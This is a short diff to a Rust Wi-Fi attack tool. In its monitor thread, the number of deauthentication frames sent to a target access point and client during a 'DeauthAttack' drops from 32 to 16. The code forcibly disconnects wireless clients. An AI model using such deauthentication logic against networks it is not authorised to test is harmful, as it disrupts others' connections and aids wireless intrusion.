@@ -79,7 +79,7 @@ impl MonitorThread{
                         match attack_info{
                             AttackInfo::DeauthAttack(attack) =>{
                                 wlan::switch_iface_channel(&self.iface, attack.station_channel);
-                                for _ in 0..32 {
+                                for _ in 0..16 {
                                     wpa::send_deauth(&self.iface, &attack.bssid, attack.client.clone());
                                 }
                                 wlan::switch_iface_channel(&self.iface,channel);
